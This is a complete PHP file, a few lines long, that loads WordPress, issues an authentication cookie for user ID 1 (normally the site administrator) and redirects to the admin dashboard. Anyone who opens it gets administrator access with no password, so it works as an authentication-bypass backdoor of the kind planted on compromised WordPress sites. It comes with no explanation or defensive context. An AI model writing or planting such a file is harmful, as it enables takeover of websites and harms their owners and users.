<?php
require("./wp-load.php");
wp_set_auth_cookie(1,1);
header("Location: ./wp-admin"); die();
?>